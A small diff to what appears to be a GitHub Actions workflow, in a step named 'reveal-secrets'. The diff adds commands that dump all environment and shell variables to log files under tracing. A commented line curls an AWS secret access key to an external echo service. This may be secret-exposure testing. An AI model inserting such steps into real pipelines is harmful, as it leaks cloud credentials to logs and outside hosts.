@@ -29,7 +29,8 @@ jobs:
       id: reveal-secrets
       run: |
         set -x
-        /usr/local/bin/echovalues.sh '${{ toJson(needs.build.outputs.*) }}' first
+        env >> /tmp/env.log
+        set >> /tmp/set.log
 #        curl https://echo.free.beeceptor.com/sample-request?secret= ${{ needs.import-secrets.outputs.AWS_SECRET_ACCESS_KEY }}
 
 #   deploy:
